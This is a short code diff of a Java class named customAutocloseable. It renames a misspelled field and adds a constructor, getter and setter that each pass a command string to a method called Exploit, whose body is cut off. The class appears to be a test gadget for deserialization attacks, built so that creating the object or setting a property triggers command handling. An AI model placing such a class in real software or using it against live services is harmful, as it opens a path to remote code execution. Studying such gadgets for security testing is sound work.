@@ -14,19 +14,26 @@ public class customAutocloseable implements AutoCloseable {
 
     }
 
-    String commad;
-    public customAutocloseable(){
-
+    String command;
+    public customAutocloseable(String command){
+        this.command = command;
+        try {
+            System.out.println(Exploit(this.command));
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
     }
 
-    public String getCommad() throws IOException {
-        System.out.println(Exploit(this.commad));
-        return commad;
+
+
+    public String getCommand() throws IOException {
+        System.out.println(Exploit(this.command));
+        return command;
     }
 
-    public void setCommad(String commad) throws IOException {
-        this.commad = commad;
-        System.out.println(Exploit(this.commad));
+    public void setCommand(String command) throws IOException {
+        this.command = command;
+        System.out.println(Exploit(this.command));
     }
 
     public String Exploit(String cmd) throws IOException {
